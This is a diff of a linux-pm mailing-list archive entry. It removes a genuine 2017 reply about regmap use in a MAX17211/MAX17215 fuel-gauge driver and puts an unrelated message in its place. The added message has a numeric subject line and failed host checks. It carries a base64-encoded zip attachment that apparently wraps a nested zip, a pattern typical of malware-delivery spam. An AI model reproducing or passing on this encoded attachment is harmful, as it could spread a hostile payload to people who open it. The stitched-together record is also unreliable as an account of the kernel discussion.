@@ -1,62 +1,101 @@
-From: "Alex A. Mihaylov" <minimumlaw@rambler.ru>
-Subject: Re: [PATCH 1/2] Add support for OneWire (W1) devices family 0x26
- (MAX17211/MAX17215)
-Date: Mon, 1 May 2017 09:13:54 +0300
-Message-ID: <f103ca48-1535-20ab-9384-f8dd34b7b57b@rambler.ru>
-References: <20170429143429.5685-1-minimumlaw@rambler.ru>
- <20170429143429.5685-2-minimumlaw@rambler.ru>
- <20170429155911.7li5torcliaoerxh@earth>
- <ee2edb43-2353-6655-a95d-ea3f3fb853eb@rambler.ru>
- <20170430205337.kwuwcyesofvqjddl@earth>
+From: <eumann@t-online.de>
+Subject: 12323 linux-pm
+Date: Mon, 01 May 2017 07:14:47 -0000
+Message-ID: <149362288752.20800.5961251380537747534@hinet.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=windows-1252; format=flowed
-Content-Transfer-Encoding: 7bit
+Content-Type: application/zip; name="6440919537155.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-pm-owner@vger.kernel.org>
-Received: from huan2.mail.rambler.ru ([81.19.78.108]:41468 "EHLO
-        huan2.mail.rambler.ru" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S2999578AbdEAGN5 (ORCPT
-        <rfc822;linux-pm@vger.kernel.org>); Mon, 1 May 2017 02:13:57 -0400
-In-Reply-To: <20170430205337.kwuwcyesofvqjddl@earth>
-Content-Language: en-GB
+Received: from [37.114.165.129] ([37.114.165.129]:46117 "HELO hinet.net"
+        rhost-flags-FAIL-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S376899AbdEAHPO (ORCPT <rfc822;linux-pm@vger.kernel.org>);
+        Mon, 1 May 2017 03:15:14 -0400
+Content-Disposition: attachment
 Sender: linux-pm-owner@vger.kernel.org
 List-Id: linux-pm@vger.kernel.org
-To: Sebastian Reichel <sre@kernel.org>
-Cc: linux-kernel@vger.kernel.org, linux-pm@vger.kernel.org, zbr@ioremap.net
+To: linux-pm@vger.kernel.org
 
-Hi!
-
-
-30.04.17 23:53, Sebastian Reichel wrote::
->>>> Slave device provide software layer for access to internal registers
->>>> MAX17211/MAX17215 chip.
->>> Please convert this to regmap.There is no generic w1 handler, but you can provide custom
->>> read/write functions.
->> I think regmap be overkill for this driver. the perception.
-> I did not ask for full usage of all regmap features. Just register
-> the read/write handler as regmap handler and use regmap_read/write
-> to get values.
->
-OK, I think about this. But max17211-battery use ONLY 
-w1_max12711x_reg_get(). This is very simple function.
-
-Second function w1_max1721x_reg_set() writen for extend feature list 
-(factory calibrating and init battery).  I think, this code must _NOT_ 
-be writen, and must _NOT_ be accessible for end user. Change calibration 
-values potentially can damage battery or device. Theory, I can unexport 
-this function and remove them from drivers code.
-
-So output registers of Maxim M5 Fuel Gauge algorithm very simple: one 
-register - one value. In driver I have two points with bitfield. First - 
-battery connected from power supply props. Second: very optional device 
-type from probe. This value _NOT_ used from driver - just write device 
-type, if manufacturer not fill this data in chip nvram.
-
-This moment driver use 14 registers. Ok, let's some time above will be 
-14*3=42 registers accessible with w1_max1721x_reg_get(). This value is 
-greatly overestimated - so many properties are not in the class 
-POWER_SUPPLY. But register range in MAX1721X is 0x1F0 (496 words or 992 
-bytes) of RAM for cache registers. As embedded system developer I 
-dislike so ram management.
-
-As result I repeat: regmap will be overkill for this driver. But OK, I 
-try to write this code. Just for fun.
+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
